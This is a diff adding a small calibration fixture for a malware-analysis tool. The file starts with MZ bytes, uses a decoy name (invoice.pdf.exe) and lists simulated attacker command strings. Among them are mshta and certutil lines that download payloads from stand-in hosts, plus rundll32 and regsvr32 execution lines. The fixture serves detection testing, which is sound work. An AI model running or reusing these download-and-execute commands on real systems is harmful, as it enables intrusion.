@@ -1,0 +1,15 @@
+MZ
+Harmless MalViz calibration fixture.
+
+This text begins with MZ so static magic-byte checks can exercise executable
+classification. It is not a valid executable.
+
+Decoy name: invoice.pdf.exe
+Simulated command strings:
+powershell -NoProfile
+cmd.exe /c whoami
+rundll32 example.dll,Start
+regsvr32 /s example.sct
+mshta http://decoy.example.test/hta
+certutil -urlcache -split -f http://198.51.100.90/drop.bin
+
